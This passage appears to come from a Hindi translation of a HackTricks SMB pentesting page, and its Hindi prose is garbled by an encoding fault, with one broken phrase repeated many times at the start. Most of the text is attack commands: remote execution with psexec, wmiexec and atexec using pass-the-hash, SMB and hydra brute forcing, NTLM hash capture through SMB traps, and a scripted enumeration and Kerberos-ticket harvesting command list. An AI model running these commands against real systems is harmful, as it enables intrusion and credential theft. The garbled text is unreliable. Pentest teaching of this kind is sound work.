--**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**
```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
```
**рдкреИрд░рд╛рдореАрдЯрд░**`-k` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **NTLM** рдХреА рдмрдЬрд╛рдп **рдХреЗрд░рдмреЗрд░реЛрд╕** рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ

### [wmiexec](../windows-hardening/ntlm/wmicexec.md)/dcomexec

**рдкреЛрд░реНрдЯ 135** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ DCOM рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбрд┐рд╕реНрдХ рдХреЛ рдЫреВрдП рдмрд┐рдирд╛ рдпрд╛ рдирдП рд╕реЗрд╡рд╛ рдЪрд▓рд╛рдП рдмрд┐рдирд╛ рдПрдХ рдХрдорд╛рдВрдб рд╢реИрд▓ рдХреЛ рдЧреБрдкреНрдд рд░реВрдк рд╕реЗ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░реЗрдВред\
**рдХрд╛рд▓реА** рдореЗрдВ рдпрд╣ /usr/share/doc/python3-impacket/examples/ рдкрд░ рд╕реНрдерд┐рдд рд╣реИред
```bash
#If no password is provided, it will be prompted
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
рдХрд┐рд╕реА **рдкреИрд░рд╛рдореАрдЯрд░**`-k` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **NTLM** рдХреА рдмрдЬрд╛рдп **рдХреЗрд░рдмреЗрд░реЛрд╕** рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
#If no password is provided, it will be prompted
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
### [AtExec](../windows-hardening/ntlm/atexec.md)

рдХрд╛рд░реНрдп рд╕реВрдЪреАрдХрд░рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЖрджреЗрд╢реЛрдВ рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░реЗрдВ (_\pipe\atsvc_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SMB рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ)ред\
**kali** рдореЗрдВ рдпрд╣ /usr/share/doc/python3-impacket/examples/ рдкрд░ рд╕реНрдерд┐рдд рд╣реИред
```bash
./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```
## Impacket рд╕рдВрджрд░реНрдн

[https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)

## **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдорд╛рдг-рдкрддреНрд░реЛрдВ рдХреЛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд░реЗрдВ**

**рдпрд╣ рд╕рд┐рдлрд╛рд░рд┐рд╢ рдирд╣реАрдВ рд╣реИ, рдЕрдЧрд░ рдЖрдк рдЕрдзрд┐рдХрддрдо рдЕрдиреБрдордд рдкреНрд░рдпрд╛рд╕реЛрдВ рдХреЛ рдкрд╛рд░ рдХрд░ рджреЗрдВ рддреЛ рдПрдХ рдЦрд╛рддрд╛ рдмреНрд▓реЙрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**
```bash
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name
```
## SMB рд░рд┐рд▓реЗ рд╣рдорд▓рд╛

рдпрд╣ рд╣рдорд▓рд╛ рд░рд┐рд╕реНрдкреЙрдиреНрдбрд░ рдЯреВрд▓рдХрд┐рдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ **рдЖрдВрддрд░рд┐рдХ рдиреЗрдЯрд╡рд░реНрдХ** рдкрд░ **SMB рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рддреНрд░реЛрдВ рдХреЛ** **рдХреИрдкреНрдЪрд░** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдФрд░ рдЙрдиреНрд╣реЗрдВ рдПрдХ **рд▓рдХреНрд╖рд┐рдд рдорд╢реАрди** рдкрд░ **рд░рд┐рд▓реЗ** рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рдкреНрд░рдорд╛рдгреАрдХрд░рдг **рд╕рддреНрд░ рд╕рдлрд▓** рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдЖрдкрдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдПрдХ **рд╕рд┐рд╕реНрдЯрдо** **рд╢реИрд▓** рдореЗрдВ рдбрд╛рд▓ рджреЗрдЧрд╛ред\
[**рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБред**](../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

## SMB-рдЯреНрд░реИрдк

Windows рдкреБрд╕реНрддрдХрд╛рд▓рдп URLMon.dll рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╣реЛрд╕реНрдЯ рдХреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреА рд╣реИ рдЬрдм рдХреЛрдИ рдкреГрд╖реНрда рдХреБрдЫ рд╕рд╛рдордЧреНрд░реА рдХреЛ SMB рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: `img src="\\10.10.10.10\path\image.jpg"`

рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде рд╣реЛрддрд╛ рд╣реИ:

* URLDownloadToFile
* URLDownloadToCache
* URLOpenStream
* URLOpenBlockingStream

рдЬреЛ рдХреБрдЫ рдмреНрд░рд╛рдЙрдЬрд╝рд░реНрд╕ рдФрд░ рдЙрдкрдХрд░рдгреЛрдВ (рдЬреИрд╕реЗ Skype) рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

![рд╕реНрд░реЛрдд: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (93).png>)

### MitMf рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SMBTrap

![рд╕реНрд░реЛрдд: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (94).png>)

## NTLM рдЪреЛрд░реА

SMB рдЯреНрд░реИрдкрд┐рдВрдЧ рдХреЗ рд╕рдорд╛рди, рд▓рдХреНрд╖рд┐рдд рд╕рд┐рд╕реНрдЯрдо рдкрд░ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдлрд╝рд╛рдЗрд▓реЗрдВ рд░рдЦрдиреЗ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП SMB рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ) рд╕реЗ рдПрдХ SMB рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдпрд╛рд╕ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ Responder рдЬреИрд╕реЗ рдЙрдкрдХрд░рдг рдХреЗ рд╕рд╛рде NetNTLMv2 рд╣реИрд╢ рдХреЛ рдмреАрдЪ рдореЗрдВ рдЖрдиреЗ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╣реИрд╢ рдлрд┐рд░ рдСрдлрд╝рд▓рд╛рдЗрди рдореЗрдВ рдХреНрд░реИрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рдЗрд╕реЗ [SMB рд░рд┐рд▓реЗ рд╣рдорд▓реЗ](pentesting-smb.md#smb-relay-attack) рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

[рджреЗрдЦреЗрдВ: ntlm\_theft](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#ntlm\_theft)

## HackTricks рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрдорд╛рдВрдб
```
Protocol_Name: SMB    #Protocol Abbreviation if there is one.
Port_Number:  137,138,139     #Comma separated if there is more than one.
Protocol_Description: Server Message Block         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMB
Note: |
While Port 139 is known technically as тАШNBT over IPтАЩ, Port 445 is тАШSMB over IPтАЩ. SMB stands for тАШServer Message BlocksтАЩ. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

#These are the commands I run in order every time I see an open SMB port

With No Creds
nbtscan {IP}
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
rpcclient {IP}
rpcclient -U "" {IP}
crackmapexec smb {IP}
crackmapexec smb {IP} --pass-pol -u "" -p ""
crackmapexec smb {IP} --pass-pol -u "guest" -p ""
GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
getArch.py -target {IP}

With Creds
smbmap -H {IP} -u {Username} -p {Password}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
crackmapexec smb {IP} -u {Username} -p {Password} --shares
GetADUsers.py {Domain_Name}/{Username}:{Password} -all
GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

https://book.hacktricks.xyz/pentesting/pentesting-smb

Entry_2:
Name: Enum4Linux
Description: General SMB Scan
Command: enum4linux -a {IP}

Entry_3:
Name: Nmap SMB Scan 1
Description: SMB Vuln Scan With Nmap
Command: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}

Entry_4:
Name: Nmap Smb Scan 2
Description: SMB Vuln Scan With Nmap (Less Specific)
Command: nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}

Entry_5:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb

Entry_6:
Name: SMB/SMB2 139/445 consolesless mfs enumeration
Description: SMB/SMB2 139/445  enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'

```
<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

рджреВрд╕рд░реЗ рддрд░реАрдХреЗ HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
